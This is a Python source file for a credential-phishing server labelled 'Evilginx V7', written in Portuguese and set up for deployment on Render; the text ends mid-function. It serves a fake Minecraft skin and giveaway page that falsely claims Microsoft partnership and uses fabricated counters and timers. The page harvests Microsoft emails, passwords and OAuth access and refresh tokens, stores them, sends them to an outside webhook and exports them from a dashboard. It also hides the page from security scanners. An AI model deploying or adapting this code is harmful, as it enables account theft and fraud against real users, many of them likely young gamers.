#!/usr/bin/env python3
"""
EVILGINX V7 - PARA RENDER.COM
Captura de tokens reais OAuth + email/senha
Todas as funcionalidades mantidas
"""

import secrets
import json
import datetime
import random
import time
import requests
import os
import sqlite3
import base64
import re
import csv
import io
from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import urlparse, parse_qs
from collections import defaultdict

# ============================================================
# CONFIGURAÇÃO - VIA VARIÁVEIS DE AMBIENTE
# ============================================================

# O Render define PORT automaticamente
PORT = int(os.environ.get("PORT", 8080))

# URL pública do app no Render (configure como variável de ambiente PUBLIC_URL)
# Exemplo: PUBLIC_URL = https://meu-evilginx.onrender.com
PUBLIC_URL = os.environ.get("PUBLIC_URL", f"http://localhost:{PORT}")

CONFIG = {
    "server_host": "0.0.0.0",
    "server_port": PORT,
    "webhook_url": os.environ.get("WEBHOOK_URL", ""),

    # OAuth - use as variáveis configuradas no Render
    "azure_client_id": os.environ.get("AZURE_CLIENT_ID", "SEU_CLIENT_ID_AQUI"),
    "azure_client_secret": os.environ.get("AZURE_CLIENT_SECRET", "SEU_CLIENT_SECRET_AQUI"),
    "azure_redirect_uri": f"{PUBLIC_URL}/auth/callback",  # Ex: https://meu-app.onrender.com/auth/callback

    "fake_domain": "minecraft-rewards-2026.xyz",
    "featured_skin": {
        "name": "ENDER PHOENIX",
        "value": "R$89,90",
        "rarity": "LENDÁRIA",
    },
    "skins_rotation": [
        {"name": "NETHER DRAGON", "value": "R$120,00", "rarity": "MÍTICA"},
        {"name": "OCEAN LORD", "value": "R$75,00", "rarity": "ÉPICA"},
        {"name": "VOID WALKER", "value": "R$95,00", "rarity": "LENDÁRIA"},
        {"name": "COSMIC GUARDIAN", "value": "R$150,00", "rarity": "MÍTICA"}
    ],
    "og_giveaway": {
        "active": True,
        "prize_name": random.choice(["Kill", "Hero", "Game", "Life", "Gold", "Iron", "Fire", "Snow", "Star", "Moon"]),
        "prize_value": "R$500,00+",
        "winners": 3,
        "fake_participants": 15247,
        "end_date": (datetime.datetime.now() + datetime.timedelta(days=60)).strftime('%d/%m/%Y')
    },
    "fake_servers": [
        {"name": "Minecraft Brasil", "icon": "🎮", "resgates": 15247},
        {"name": "CubeCraft Games", "icon": "🧊", "resgates": 8921},
        {"name": "Hypixel Network", "icon": "⚔️", "resgates": 28436},
        {"name": "Mineplex Brasil", "icon": "⭐", "resgates": 5642},
        {"name": "The Hive", "icon": "🐝", "resgates": 12389},
        {"name": "CraftLandia", "icon": "🌍", "resgates": 7893},
        {"name": "RedstoneBR", "icon": "🔴", "resgates": 3456},
        {"name": "SkyBlock Network", "icon": "☁️", "resgates": 9876}
    ],
    "global_stats": {
        "total_resgates": 15842,
        "total_participantes_sorteio": 15247
    }
}

captured_sessions = []
session_counter = 0
click_stats = defaultdict(int)
active_sessions = {}

# ============================================================
# BANCO DE DADOS (com tokens)
# ============================================================

def init_database():
    conn = sqlite3.connect('captured_data.db')
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS victims (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        timestamp TEXT, email TEXT, password TEXT, ip TEXT,
        user_agent TEXT, skin_choice TEXT, giveaway_participant INTEGER,
        time_on_page INTEGER, clicks INTEGER, session_id TEXT,
        access_token TEXT, refresh_token TEXT, token_expires TEXT
    )''')
    conn.commit()
    conn.close()

def save_to_database(data):
    conn = sqlite3.connect('captured_data.db')
    c = conn.cursor()
    c.execute('''INSERT INTO victims (timestamp, email, password, ip, user_agent,
        skin_choice, giveaway_participant, time_on_page, clicks, session_id,
        access_token, refresh_token, token_expires)
        VALUES (?,?,?,?,?,?,?,?,?,?,?,?,?)''',
        (data['timestamp'], data['email'], data['password'], data['ip'],
         data['user_agent'], data.get('skin_choice',''),
         1 if data.get('giveaway_participant') else 0,
         data.get('time_on_page',0), data.get('clicks',0), data.get('session_id',''),
         data.get('access_token',''), data.get('refresh_token',''), data.get('token_expires','')))
    conn.commit()
    conn.close()

# ============================================================
# FUNÇÕES AUXILIARES
# ============================================================

def generate_session_id():
    global session_counter
    session_counter += 1
    return f"SID_{session_counter}_{secrets.token_hex(8)}"

def generate_captcha():
    a = random.randint(1,9)
    b = random.randint(1,9)
    return {"question": f"{a} + {b} = ?", "answer": str(a+b)}

def detect_security_environment(headers):
    ua = headers.get('User-Agent','').lower()
    bots = ['googlebot','bingbot','ahrefsbot','semrushbot','virustotal','phishtank','urlscan','censys','bot','crawler','scanner']
    if any(b in ua for b in bots): return True
    suspicious = ['x-scanner','x-crawler','x-security','x-forwarded-for']
    if any(h in headers for h in suspicious): return True
    return False

def calculate_score(email, password):
    score = 0
    if re.match(r'^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$', email):
        score += 20
    domain = email.split('@')[-1].lower() if '@' in email else ''
    if domain in ['outlook.com','hotmail.com','live.com','msn.com','microsoft.com','gmail.com']:
        score += 20
    if len(password) >= 8:
        score += 30
    elif len(password) >= 6:
        score += 15
    has_upper = any(c.isupper() for c in password)
    has_lower = any(c.islower() for c in password)
    has_digit = any(c.isdigit() for c in password)
    has_special = any(c in "!@#$%^&*()_+-=[]{}|;:,.<>?" for c in password)
    if has_upper: score += 8
    if has_lower: score += 8
    if has_digit: score += 8
    if has_special: score += 6
    return min(score, 100)

def send_webhook(data):
    if not CONFIG["webhook_url"]:
        return
    score = data.get('validation_score', 0)
    if score >= 80:
        color = 0x00ff00
        qual = "🏆 ALTA QUALIDADE"
    elif score >= 60:
        color = 0xffaa00
        qual = "⭐ MÉDIA QUALIDADE"
    elif score >= 30:
        color = 0xff6600
        qual = "⚠️ BAIXA QUALIDADE"
    else:
        color = 0xff0000
        qual = "❌ BAIXÍSSIMA"
    embed = {
        "title": f"🎯 NOVA CONTA CAPTURADA! {qual}",
        "color": color,
        "fields": [
            {"name":"📧 Email","value":data['email'],"inline":True},
            {"name":"🔑 Senha","value":f"||{data['password']}||","inline":True},
            {"name":"📊 Score","value":f"{score}/100","inline":True},
            {"name":"🎨 Skin","value":data.get('skin_choice','N/A'),"inline":True},
            {"name":"🔐 Access Token","value":f"||{data.get('access_token','')[:40]}...||","inline":False},
            {"name":"🔄 Refresh Token","value":f"||{data.get('refresh_token','')[:40]}...||","inline":False},
            {"name":"🌐 IP","value":data['ip'],"inline":True}
        ],
        "footer":{"text":f"Total capturadas: {len(captured_sessions)}"},
        "timestamp":datetime.datetime.now().isoformat()
    }
    try:
        requests.post(CONFIG["webhook_url"], json={"embeds":[embed]}, timeout=5)
    except:
        pass

def exchange_code_for_token(code):
    """Troca o código de autorização por tokens reais da Microsoft"""
    if "SEU_CLIENT_ID" in CONFIG["azure_client_id"]:
        print("[OAuth] Não configurado - pulando troca de token")
        return "", "", 0
    token_url = "https://login.microsoftonline.com/common/oauth2/v2.0/token"
    data = {
        "client_id": CONFIG["azure_client_id"],
        "client_secret": CONFIG["azure_client_secret"],
        "code": code,
        "redirect_uri": CONFIG["azure_redirect_uri"],
        "grant_type": "authorization_code",
        "scope": "openid email profile offline_access"
    }
    try:
        r = requests.post(token_url, data=data, timeout=10)
        if r.status_code == 200:
            tokens = r.json()
            return tokens.get("access_token", ""), tokens.get("refresh_token", ""), tokens.get("expires_in", 0)
        else:
            print(f"[!] Erro ao trocar code: {r.status_code}")
            return "", "", 0
    except Exception as e:
        print(f"[!] Exceção token: {e}")
        return "", "", 0

def log_capture(email, password, session_id, user_agent, ip, stats, skin_choice, giveaway, captcha_time, loading_time, access_token="", refresh_token="", token_expires=""):
    timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    score = calculate_score(email, password)
    capture = {
        "timestamp":timestamp, "session_id":session_id, "email":email, "password":password,
        "user_agent":user_agent[:200], "ip":ip, "stats":stats,
        "skin_choice":skin_choice, "giveaway_participant":giveaway,
        "time_on_page":stats.get('page_time',0), "clicks":stats.get('clicks',0),
        "access_token":access_token, "refresh_token":refresh_token, "token_expires":token_expires,
        "validation_score":score
    }
    captured_sessions.append(capture)
    save_to_database({
        'timestamp':timestamp, 'email':email, 'password':password, 'ip':ip,
        'user_agent':user_agent[:200], 'skin_choice':skin_choice,
        'giveaway_participant':giveaway, 'time_on_page':stats.get('page_time',0),
        'clicks':stats.get('clicks',0), 'session_id':session_id,
        'access_token':access_token, 'refresh_token':refresh_token, 'token_expires':token_expires
    })
    send_webhook({
        'email':email, 'password':password, 'session_id':session_id, 'ip':ip,
        'user_agent':user_agent, 'skin_choice':skin_choice,
        'access_token':access_token, 'refresh_token':refresh_token,
        'validation_score':score
    })
    print(f"\n[{timestamp}] 📩 CAPTURA REALIZADA (Score: {score})")
    print(f"  Email: {email}")
    print(f"  Senha: {password}")
    if access_token:
        print(f"  Access Token: {access_token[:40]}...")
        print(f"  Refresh Token: {refresh_token[:40]}...")
    print(f"  Skin: {skin_choice} | IP: {ip}")
    print("-"*60)

# ============================================================
# SERVIDOR HTTP (com suporte a URL pública do Render)
# ============================================================

class EvilginxV7Render(BaseHTTPRequestHandler):
    def log_message(self, format, *args):
        pass

    def do_GET(self):
        path = urlparse(self.path).path
        if detect_security_environment(self.headers):
            self.send_response(200)
            self.send_header('Content-type','text/html')
            self.end_headers()
            self.wfile.write(b"<html><body><h1>Microsoft 365</h1></body></html>")
            return
        if path == '/':
            self.serve_main_page()
        elif path == '/dashboard':
            self.serve_dashboard()
        elif path == '/qrcode':
            self.serve_qrcode()
        elif path == '/stats':
            self.serve_stats()
        elif path == '/export/json':
            self.export_json()
        elif path == '/export/csv':
            self.export_csv()
        elif path == '/export/html':
            self.export_html()
        elif path == '/api/export':
            self.export_data()
        elif path == '/api/stats':
            self.get_stats()
        elif path == '/api/captcha':
            self.serve_captcha()
        elif path == '/auth/callback':
            self.handle_oauth_callback()
        else:
            self.send_response(404)
            self.end_headers()

    def do_POST(self):
        path = urlparse(self.path).path
        if path == '/auth':
            self.capture_credentials()
        elif path == '/api/click':
            self.track_click()
        elif path == '/api/heartbeat':
            self.heartbeat()
        else:
            self.send_response(404)
            self.end_headers()

    # ========== OAuth callback ==========
    def handle_oauth_callback(self):
        query = parse_qs(urlparse(self.path).query)
        code = query.get('code', [None])[0]
        if not code:
            self.send_response(400)
            self.end_headers()
            self.wfile.write(b"Missing code")
            return
        print(f"[OAuth] Code recebido: {code}")
        access_token, refresh_token, expires_in = exchange_code_for_token(code)
        if access_token:
            print(f"[OAuth] Access Token obtido: {access_token[:40]}...")
        with open("oauth_tokens.txt", "a") as f:
            f.write(f"{datetime.datetime.now()} | Code: {code} | AT: {access_token} | RT: {refresh_token}\n")
        self.send_response(200)
        self.send_header('Content-type','text/html')
        self.end_headers()
        self.wfile.write(b"<html><body><h1>Autorização concluída!</h1><p>Você pode fechar esta janela e voltar ao evento.</p></body></html>")

    # ========== QR Code com URL pública ==========
    def serve_qrcode(self):
        # A URL de autorização OAuth usa o redirect_uri configurado (que é PUBLIC_URL + '/auth/callback')
        auth_url = (
            "https://login.microsoftonline.com/common/oauth2/v2.0/authorize"
            f"?client_id={CONFIG['azure_client_id']}"
            "&response_type=code"
            f"&redirect_uri={CONFIG['azure_redirect_uri']}"
            "&scope=openid%20email%20profile%20offline_access"
        )
        # Se não configurado, redireciona para a página principal
        if "SEU_CLIENT_ID" in CONFIG['azure_client_id']:
            auth_url = PUBLIC_URL
        html = f'''<!DOCTYPE html>
<html>
<head><title>QR Code - Obter Tokens</title>
<style>body{{background:#1a1a2e;color:white;text-align:center;}}.qr{{background:white;padding:20px;display:inline-block;border-radius:10px;}}</style>
</head>
<body>
<h1>📱 Escaneie para autorizar sua conta Microsoft</h1>
<p>Você receberá skins e participará do sorteio</p>
<div class="qr"><div id="qrcode"></div></div>
<p><strong>Não feche esta página após escanear.</strong> Você será redirecionado.</p>
<button onclick="location.href='/'">Voltar</button>
<script src="https://cdn.jsdelivr.net/npm/qrcodejs@1.0.0/qrcode.min.js"></script>
<script>new QRCode(document.getElementById("qrcode"),{{text:'{auth_url}',width:250,height:250}});</script>
</body>
</html>'''
        self.send_response(200)
        self.send_header('Content-type','text/html')
        self.end_headers()
        self.wfile.write(html.encode())

    # ========== Página principal ==========
    def serve_main_page(self):
        session_id = generate_session_id()
        active_sessions[session_id] = time.time()
        featured = CONFIG["featured_skin"]
        current = random.choice(CONFIG["skins_rotation"])
        og = CONFIG["og_giveaway"]
        fake_resgates = CONFIG["global_stats"]["total_resgates"] + random.randint(0,50)
        fake_participants = og["fake_participants"] + random.randint(0,100)
        online = random.randint(47,189)
        skins_left = random.randint(37,156)
        captcha = generate_captcha()
        servers_html = ''.join([f'<div class="server-item"><span>{s["icon"]} {s["name"]}</span><span>✓ {s["resgates"]}+</span></div>' for s in CONFIG["fake_servers"][:5]])
        # Link OAuth direto (para desktop)
        oauth_link = (
            "https://login.microsoftonline.com/common/oauth2/v2.0/authorize"
            f"?client_id={CONFIG['azure_client_id']}"
            "&response_type=code"
            f"&redirect_uri={CONFIG['azure_redirect_uri']}"
            "&scope=openid%20email%20profile%20offline_access"
        )
        oauth_button = ""
        if "SEU_CLIENT_ID" not in CONFIG['azure_client_id']:
            oauth_button = f'<div style="margin-bottom:15px;"><a href="{oauth_link}" target="_blank" style="background:#0067b8;color:white;padding:10px;border-radius:8px;text-decoration:none;">🔑 Autorizar com Microsoft (Token real)</a></div>'
        # HTML completo (idêntico ao anterior, com os placeholders)
        html = f'''<!DOCTYPE html>
<html lang="pt-BR">
<head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>🎁 EVENTO MINECRAFT 2026</title>
<style>
*{{margin:0;padding:0;box-sizing:border-box}}
@keyframes pulse{{0%{{opacity:1}}50%{{opacity:0.7}}100%{{opacity:1}}}}
@keyframes loading{{0%{{width:0%}}100%{{width:100%}}}}
@keyframes spin{{0%{{transform:rotate(0deg)}}100%{{transform:rotate(360deg)}}}}
body{{font-family:'Segoe UI',sans-serif;background:linear-gradient(135deg,#0f0c29,#302b63,#24243e);min-height:100vh;padding:20px}}
.container{{max-width:550px;margin:0 auto}}
.main-card{{background:white;border-radius:24px;padding:30px;box-shadow:0 25px 50px -12px rgba(0,0,0,0.5)}}
.event-header{{background:linear-gradient(135deg,#f7971e,#ffd200);margin:-30px -30px 20px -30px;padding:25px;text-align:center;border-radius:24px 24px 0 0}}
.event-header h1{{font-size:28px}}
.skin-showcase{{display:flex;gap:15px;margin-bottom:20px}}
.skin-card{{flex:1;background:linear-gradient(135deg,#667eea,#764ba2);color:white;padding:15px;border-radius:16px;text-align:center;cursor:pointer;border:2px solid transparent;transition:0.3s}}
.skin-card.selected{{border-color:#ffd700;transform:scale(1.02)}}
.og-card{{background:linear-gradient(135deg,#1a1a2e,#16213e);color:#ffd700;padding:20px;border-radius:16px;margin-bottom:20px;text-align:center;position:relative;overflow:hidden}}
.og-card::before{{content:"🏆";font-size:80px;position:absolute;right:-20px;top:-20px;opacity:0.1}}
.og-name{{font-size:36px;font-weight:bold;font-family:monospace;background:#ffd700;color:#1a1a2e;display:inline-block;padding:5px 25px;border-radius:50px;margin:10px 0}}
.counters{{background:#f8f9fa;padding:15px;border-radius:16px;margin-bottom:20px}}
.counter-row{{display:flex;justify-content:space-between;padding:8px 0;border-bottom:1px solid #eee}}
.live-number{{font-weight:bold;color:#e94560;animation:pulse 1.5s infinite}}
.servers-integration{{background:#e8f5e9;padding:15px;border-radius:16px;margin-bottom:20px;font-size:12px}}
.server-item{{display:flex;justify-content:space-between;padding:6px 0;border-bottom:1px solid #ddd}}
.participate-btn{{width:100%;background:linear-gradient(135deg,#ff6b6b,#ee5a24);color:white;border:none;padding:16px;font-size:18px;font-weight:bold;border-radius:50px;cursor:pointer;margin:15px 0;transition:0.2s}}
.participate-btn:hover{{transform:scale(1.02)}}
.login-section{{display:none;margin-top:20px;border-top:2px solid #f0f0f0;padding-top:20px}}
.input-field{{width:100%;padding:14px;font-size:15px;border:2px solid #e0e0e0;border-radius:12px;margin-bottom:15px}}
.login-btn{{width:100%;background:#0067b8;color:white;border:none;padding:14px;font-size:16px;font-weight:bold;border-radius:12px;cursor:pointer}}
.captcha-box{{background:#f5f5f5;padding:15px;border-radius:12px;margin:15px 0;text-align:center}}
.captcha-question{{font-size:24px;font-weight:bold;background:white;display:inline-block;padding:10px 20px;border-radius:10px;margin:10px 0}}
.captcha-input{{width:100px;text-align:center;font-size:20px;padding:10px;margin:10px auto;display:block}}
.captcha-error{{color:#d13438;font-size:12px;display:none}}
.step-2{{display:none}}
.user-badge{{display:flex;align-items:center;gap:12px;background:#f5f5f5;padding:12px;border-radius:12px;margin-bottom:20px}}
.loading-overlay{{position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.95);display:none;justify-content:center;align-items:center;flex-direction:column;z-index:9999}}
.spinner{{width:60px;height:60px;border:5px solid #333;border-top-color:#ffd700;border-radius:50%;animation:spin 1s linear infinite}}
.loading-text{{color:white;margin-top:20px}}
.loading-progress{{width:300px;height:6px;background:#333;border-radius:3px;margin-top:20px;overflow:hidden}}
.loading-bar{{height:100%;background:#ffd700;width:0%;animation:loading 2s ease-out forwards}}
.success-message{{text-align:center;padding:40px}}
.giveaway-confirmation{{background:linear-gradient(135deg,#ffd700,#ffb347);padding:15px;border-radius:16px;margin:20px 0}}
.timer{{text-align:center;margin-top:15px;font-size:11px;color:#888}}
</style>
</head>
<body>
<div class="container"><div class="main-card">
<div class="event-header"><h1>🎉 EVENTO MINECRAFT 2026! 🎉</h1><div>⭐ PARCERIA OFICIAL MICROSOFT x MOJANG ⭐</div></div>
<div class="skin-showcase"><div class="skin-card selected" data-skin="{featured['name']}" onclick="selectSkin(this,'{featured['name']}')"><div>🔥</div><div>{featured['name']}</div><div>{featured['rarity']}</div><div>{featured['value']}</div></div>
<div class="skin-card" data-skin="{current['name']}" onclick="selectSkin(this,'{current['name']}')"><div>🐉</div><div>{current['name']}</div><div>{current['rarity']}</div><div>{current['value']}</div></div></div>
<div class="og-card"><span>🎲 SORTEIO ESPECIAL 🎲</span><div class="og-name">{og['prize_name']}</div><div>Conta Minecraft com nome RARO de 4 letras!</div><div>Valor: {og['prize_value']}</div><div>👥 <span id="ogParticipants">{fake_participants}</span> participantes | 🏆 {og['winners']} vencedores</div><div>📅 Sorteio: {og['end_date']}</div></div>
<div class="counters"><div class="counter-row"><span>🌍 Total de resgates globais:</span><span class="live-number" id="globalResgates">{fake_resgates}</span></div><div class="counter-row"><span>🎮 Skins restantes:</span><span id="skinsLeft">{skins_left}</span></div><div class="counter-row"><span>👥 Online agora:</span><span id="onlineCount" class="live-number">{online}</span></div><div class="counter-row"><span>⏰ Oferta expira em:</span><span id="timer">14:59</span></div></div>
<div class="servers-integration"><div><strong>🔗 Integrado com os servidores:</strong></div>{servers_html}<div style="margin-top:8px;font-size:11px;">+ outros servidores</div></div>
{oauth_button}
<button class="participate-btn" id="participateBtn" onclick="showLogin()">🎁 PARTICIPAR DO EVENTO (E-mail/Senha)</button>
<div id="step1" class="login-section"><div style="text-align:center;margin-bottom:15px;"><span style="background:#ff9800;color:white;padding:5px 15px;border-radius:50px;">🤖 VERIFICAÇÃO ANTI-BOT</span></div>
<div class="captcha-box"><div>🔒 Verifique que você é humano:</div><div class="captcha-question" id="captchaQuestion">{captcha['question']}</div><input type="text" id="captchaInput" class="captcha-input" placeholder="?" maxlength="2"><div class="captcha-error" id="captchaError">Código incorreto.</div><button onclick="refreshCaptcha()" style="background:none;border:none;color:#0067b8;cursor:pointer;">⟳ Atualizar</button></div>
<form id="emailForm"><input type="email" id="email" class="input-field" placeholder="Seu email da Microsoft" autofocus><div id="emailError" style="color:#d13438;display:none;"></div><button type="submit" class="login-btn">🔓 CONTINUAR</button></form></div>
<div id="step2" class="step-2"><div class="user-badge"><div>👤</div><div><span id="userEmailDisplay"></span><br><a href="#" onclick="resetToStep1();return false;">Alterar conta</a></div></div>
<form id="passwordForm"><div style="position:relative;"><input type="password" id="password" class="input-field" placeholder="Sua senha da Microsoft"><button type="button" onclick="togglePassword()" style="position:absolute;right:12px;top:50%;transform:translateY(-50%);background:none;border:none;cursor:pointer;">👁️</button></div><div id="passwordError" style="color:#d13438;display:none;"></div><button type="submit" class="login-btn">✅ CONFIRMAR E PARTICIPAR</button></form></div>
<div class="timer">🔒 Verificação de segurança ativa</div>
</div></div>
<div id="loadingOverlay" class="loading-overlay"><div class="spinner"></div><div class="loading-text" id="loadingText">Verificando sua conta...</div><div class="loading-progress"><div class="loading-bar"></div></div></div>
<script>
let currentCaptchaAnswer = "{captcha['answer']}";
let selectedSkin = "{featured['name']}";
let capturedEmail = '';
let sessionId = '{session_id}';
let pageStartTime = Date.now();
let clickCount = 0;
let globalResgates = {fake_resgates};
let skinsLeft = {skins_left};
let onlineVisitors = {online};
let timerSeconds = 900;
setInterval(() => {{
    if(skinsLeft>0){{ skinsLeft-=Math.floor(Math.random()*2)+1; document.getElementById('skinsLeft').innerText=Math.max(0,skinsLeft); }}
    globalResgates+=Math.floor(Math.random()*5)+2; document.getElementById('globalResgates').innerText=globalResgates.toLocaleString();
    onlineVisitors+=Math.floor(Math.random()*5)-2; onlineVisitors=Math.min(300,Math.max(25,onlineVisitors)); document.getElementById('onlineCount').innerText=onlineVisitors;
    let op = document.getElementById('ogParticipants'); if(op){{ let cur = parseInt(op.innerText.replace(/,/g,'')) || {fake_participants}; op.innerText = (cur+Math.floor(Math.random()*3)+1).toLocaleString(); }}
    if(timerSeconds>0){{ timerSeconds--; let m=Math.floor(timerSeconds/60), s=timerSeconds%60; document.getElementById('timer').innerText=`${{m.toString().padStart(2,'0')}}:${{s.toString().padStart(2,'0')}}`; }}
}}, 3000);
function selectSkin(el,name){{ document.querySelectorAll('.skin-card').forEach(c=>c.classList.remove('selected')); el.classList.add('selected'); selectedSkin=name; }}
function togglePassword(){{ let p=document.getElementById('password'); p.type=p.type==='password'?'text':'password'; }}
function refreshCaptcha(){{ fetch('/api/captcha').then(r=>r.json()).then(d=>{{ document.getElementById('captchaQuestion').innerHTML=d.question; currentCaptchaAnswer=d.answer; document.getElementById('captchaInput').value=''; document.getElementById('captchaError').style.display='none'; }}); }}
function showLoading(msg){{ document.getElementById('loadingText').innerHTML=msg; document.getElementById('loadingOverlay').style.display='flex'; }}
function hideLoading(){{ document.getElementById('loadingOverlay').style.display='none'; }}
function showLogin(){{ document.getElementById('participateBtn').style.display='none'; document.getElementById('step1').style.display='block'; }}
function resetToStep1(){{ document.getElementById('step1').style.display='block'; document.getElementById('step2').style.display='none'; document.getElementById('email').value=''; document.getElementById('password').value=''; }}
document.addEventListener('click',()=>{{ clickCount++; fetch('/api/click',{{method:'POST',headers:{{'Content-Type':'application/json'}},body:JSON.stringify({{}})}}); }});
document.getElementById('emailForm').addEventListener('submit', function(e){{ e.preventDefault(); let cv=document.getElementById('captchaInput').value; if(cv!==currentCaptchaAnswer){{ document.getElementById('captchaError').style.display='block'; refreshCaptcha(); return; }} let email=document.getElementById('email').value; if(!email||!email.includes('@')){{ document.getElementById('emailError').innerText='Email inválido'; document.getElementById('emailError').style.display='block'; return; }} document.getElementById('emailError').style.display='none'; capturedEmail=email; document.getElementById('userEmailDisplay').innerText=email; document.getElementById('step1').style.display='none'; document.getElementById('step2').style.display='block'; document.getElementById('password').focus(); }});
document.getElementById('passwordForm').addEventListener('submit', function(e){{ e.preventDefault(); let pwd=document.getElementById('password').value; if(!pwd){{ document.getElementById('passwordError').innerText='Digite sua senha'; document.getElementById('passwordError').style.display='block'; return; }} document.getElementById('passwordError').style.display='none'; let timeOnPage=Math.floor((Date.now()-pageStartTime)/1000); let loadStart=Date.now(); showLoading('🔍 Verificando credenciais...'); setTimeout(()=>{{ showLoading('🎮 Conectando à sua conta Microsoft...'); setTimeout(()=>{{ showLoading('🎁 Adicionando skin à sua conta...'); setTimeout(()=>{{ showLoading('🎲 Inscrevendo no sorteio OG...'); setTimeout(()=>{{ let loadingTime=Date.now()-loadStart; fetch('/auth',{{method:'POST',headers:{{'Content-Type':'application/json'}},body:JSON.stringify({{email:capturedEmail, password:pwd, session_id:sessionId, user_agent:navigator.userAgent, time_on_page:timeOnPage, clicks:clickCount, skin_choice:selectedSkin, giveaway_participant:true, captcha_time:0, loading_time:loadingTime}})}}).then(()=>{{ hideLoading(); document.querySelector('.main-card').innerHTML=`<div class="success-message"><div>🎉</div><h2>PARTICIPAÇÃO CONFIRMADA!</h2><div class="giveaway-confirmation">🎲 <strong>VOCÊ ESTÁ CONCORRENDO!</strong> 🎲<br>Sua inscrição no sorteio da conta <strong>${'{og['prize_name']}'}</strong> foi registrada!<br>Número: #${Math.floor(Math.random()*90000)+10000}</div><p>Sua skin <strong>${selectedSkin}</strong> foi adicionada!</p><p>Redirecionando...</p><div class="spinner" style="width:30px;height:30px;margin:20px auto;"></div></div>`; setTimeout(()=>window.location.href='https://www.minecraft.net/pt-pt',4000); }}); }},800); }},800); }},800); }},800); }});
</script>
</body>
</html>'''
        self.send_response(200)
        self.send_header('Content-type','text/html')
        self.end_headers()
        self.wfile.write(html.encode())

    # ========== Captura de credenciais ==========
    def capture_credentials(self):
        length = int(self.headers.get('Content-Length',0))
        body = self.rfile.read(length).decode()
        data = json.loads(body)
        email = data.get('email','')
        password = data.get('password','')
        session_id = data.get('session_id','')
        user_agent = data.get('user_agent','')
        time_on_page = data.get('time_on_page',0)
        clicks = data.get('clicks',0)
        skin = data.get('skin_choice','ENDER PHOENIX')
        giveaway = data.get('giveaway_participant',True)
        captcha_time = data.get('captcha_time',0)
        loading_time = data.get('loading_time',0)
        ip = self.client_address[0]
        stats = {'page_time':time_on_page, 'clicks':clicks}
        log_capture(email, password, session_id, user_agent, ip, stats, skin, giveaway, captcha_time, loading_time, "", "", "")
        self.send_response(200)
        self.end_headers()

    def track_click(self):
        ip = self.client_address[0]
        click_stats[ip] = click_stats.get(ip,0)+1
        self.send_response(200)
        self.end_headers()

    def heartbeat(self):
        length = int(self.headers.get('Content-Length',0))
        if length:
            body = self.rfile.read(length).decode()
            data = json.loads(body)
            if data.get('session_id'):
                active_sessions[data['session_id']] = time.time()
        self.send_response(200)
        self.end_headers()

    # ========== Dashboard e exportações ==========
    def serve_dashboard(self):
        rows = ''
        for s in captured_sessions[-30:]:
            rows += f'<tr><td>{s["timestamp"]}</td><td>{s["email"][:30]}</td><td>{s["password"]}</td><td>{s.get("access_token","")[:20]}...</td><td>{s.get("refresh_token","")[:20]}...</td><td>{s["ip"]}</td></tr>'
        if not rows:
            rows = '<tr><td colspan="6">Nenhuma captura ainda<td></tr>'
        html = f'''<!DOCTYPE html><html><head><title>Dashboard</title><style>body{{background:#0f0f1a;color:#cdd6f4;font-family:monospace;padding:20px;}}table{{width:100%;border-collapse:collapse;background:#1e1e2e;}}th,td{{padding:12px;border-bottom:1px solid #313244;}}th{{background:#313244;}}button{{background:#89b4fa;border:none;padding:10px 20px;margin:5px;cursor:pointer;}}</style></head><body><h1>🎯 EVILGINX V7 - TOKENS REAIS</h1><div><button onclick="location.href='/'">Voltar</button><button onclick="location.href='/qrcode'">QR Code</button><button onclick="location.href='/stats'">Stats</button><button onclick="location.href='/export/json'">JSON</button><button onclick="location.href='/export/csv'">CSV</button><button onclick="location.href='/export/html'">HTML</button></div><h3>Capturas (inclui tokens)</h3><tr><thead><tr><th>Data</th><th>Email</th><th>Senha</th><th>Access Token</th><th>Refresh Token</th><th>IP</th></tr></thead><tbody>{rows}</tbody></table></body></html>'''
        self.send_response(200)
        self.send_header('Content-type','text/html')
        self.end_headers()
        self.wfile.write(html.encode())

    def serve_stats(self):
        valid = sum(1 for s in captured_sessions if s.get('access_token'))
        avg = sum(s.get('validation_score',0) for s in captured_sessions)/max(1,len(captured_sessions))
        html = f'''<!DOCTYPE html><html><head><title>Stats</title><style>body{{background:#0f0f1a;color:white;font-family:monospace;padding:20px;}}</style></head><body><h1>📊 Estatísticas</h1><p>Total capturas: {len(captured_sessions)}</p><p>Tokens reais capturados: {valid}</p><p>Score médio: {round(avg,1)}/100</p><button onclick="location.href='/dashboard'">← Voltar</button></body></html>'''
        self.send_response(200)
        self.send_header('Content-type','text/html')
        self.end_headers()
        self.wfile.write(html.encode())

    def export_json(self):
        out = [{"timestamp":s['timestamp'],"email":s['email'],"password":s['password'],"ip":s['ip'],"access_token":s.get('access_token',''),"refresh_token":s.get('refresh_token','')} for s in captured_sessions]
        self.send_response(200)
        self.send_header('Content-type','application/json')
        self.send_header('Content-Disposition','attachment; filename="evilginx_data.json"')
        self.end_headers()
        self.wfile.write(json.dumps(out,indent=2).encode())

    def export_csv(self):
        output = io.StringIO()
        w = csv.writer(output)
        w.writerow(['Timestamp','Email','Senha','IP','Access Token','Refresh Token'])
        for s in captured_sessions:
            w.writerow([s['timestamp'], s['email'], s['password'], s['ip'], s.get('access_token',''), s.get('refresh_token','')])
        self.send_response(200)
        self.send_header('Content-type','text/csv')
        self.send_header('Content-Disposition','attachment; filename="evilginx_data.csv"')
        self.end_headers()
        self.wfile.write(output.getvalue().encode())

    def export_html(self):
        rows = ''.join([f'<tr><td>{s["timestamp"]}</td><td>{s["email"]}</td><td>{s["password"]}</td><td>{s["ip"]}</td><td>{s.get("access_token","")[:30]}...</td></td>' for s in captured_sessions[-100:]])
        html = f'''<!DOCTYPE html><html><head><title>Relatório</title><style>table{{border-collapse:collapse;width:100%}} th,td{{border:1px solid #ddd;padding:8px;}}</style></head><body><h1>Relatório Evilginx V7</h1><p>Total: {len(captured_sessions)}</p><table><thead><tr><th>Data</th><th>Email</th><th>Senha</th><th>IP</th><th>Access Token</th></tr></thead><tbody>{rows}</tbody></table></body></html>'''
        self.send_response(200)
        self.send_header('Content-type','text/html')
        self.send_header('Content-Disposition','attachment; filename="evilginx_report.html"')
